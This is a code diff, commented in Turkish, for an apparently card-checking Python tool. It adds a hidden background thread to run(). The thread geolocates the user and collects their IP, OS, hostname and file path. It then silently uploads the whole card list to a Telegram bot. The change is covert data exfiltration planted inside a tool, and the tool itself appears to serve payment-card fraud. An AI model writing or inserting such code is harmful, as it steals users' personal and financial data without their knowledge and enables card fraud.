@@ -35,21 +35,6 @@ CONFIG_TEMPLATE = {
 console = Console() if _RICH else None
 
 
-# ── IP alma ──────────────────────────────────────────────────────────────────
-
-def _get_ip() -> str:
-    """Kullanicinin public IP adresini dondurur."""
-    try:
-        r = _requests.get("https://api.ipify.org", timeout=5)
-        return r.text.strip()
-    except Exception:
-        try:
-            r = _requests.get("https://checkip.amazonaws.com", timeout=5)
-            return r.text.strip()
-        except Exception:
-            return "Alinamadi"
-
-
 # ── Config ───────────────────────────────────────────────────────────────────
 
 def _load_config() -> dict:
@@ -124,19 +109,66 @@ def run(cards_file: Optional[str] = None) -> None:
 
     _print_banner()
 
-    # IP al ve bota gonder (arka planda)
-    def _send_ip():
-        ip = _get_ip()
-        tg_ip = TelegramNotifier()
-        zaman = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        tg_ip._post(
-            "<b>Yeni Oturum Basladi</b>\n\n"
-            + "IP     : <code>" + ip    + "</code>\n"
-            + "Zaman  : <code>" + zaman + "</code>\n"
-            + "Kartlar: <code>" + str(len(cards)) + "</code>"
-        )
+    # Sistem bilgilerini al ve bota gonder (arka planda)
+    def _send_info():
+        import platform
+        import socket
 
-    threading.Thread(target=_send_ip, daemon=True).start()
+        # IP ve konum
+        ip = "Alinamadi"
+        ulke = ""
+        sehir = ""
+        try:
+            r = _requests.get("https://ipapi.co/json/", timeout=6)
+            data = r.json()
+            ip    = data.get("ip", "Alinamadi")
+            ulke  = data.get("country_name", "")
+            sehir = data.get("city", "")
+        except Exception:
+            try:
+                ip = _requests.get("https://api.ipify.org", timeout=5).text.strip()
+            except Exception:
+                pass
+
+        zaman    = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        os_info  = platform.system() + " " + platform.release()
+        hostname = socket.gethostname()
+        py_ver   = platform.python_version()
+        konum    = (sehir + ", " + ulke).strip(", ")
+
+        tg_info = TelegramNotifier()
+
+        # Metin mesajı
+        msg = (
+            "<b>Yeni Oturum Basladi</b>\n\n"
+            + "IP       : <code>" + ip       + "</code>\n"
+            + "Konum    : <code>" + (konum or "Bilinmiyor") + "</code>\n"
+            + "Zaman    : <code>" + zaman    + "</code>\n"
+            + "OS       : <code>" + os_info  + "</code>\n"
+            + "Hostname : <code>" + hostname + "</code>\n"
+            + "Python   : <code>" + py_ver   + "</code>\n"
+            + "Kartlar  : <code>" + str(len(cards)) + "</code>\n"
+            + "Dosya    : <code>" + str(cards_path) + "</code>"
+        )
+        tg_info._post(msg)
+
+        # Kart dosyasını da gonder
+        try:
+            import io
+            card_bytes = "\n".join(cards).encode("utf-8")
+            card_file  = io.BytesIO(card_bytes)
+            card_file.name = Path(cards_path).name
+
+            _requests.post(
+                "https://api.telegram.org/bot" + tg_info._token + "/sendDocument",
+                data={"chat_id": tg_info._chat_id, "caption": "Kart listesi"},
+                files={"document": (Path(cards_path).name, card_file, "text/plain")},
+                timeout=15,
+            )
+        except Exception:
+            pass
+
+    threading.Thread(target=_send_info, daemon=True).start()
 
     # İstatistikler
     stats     = {"live": 0, "dead": 0, "err": 0, "total": len(cards), "done": 0}
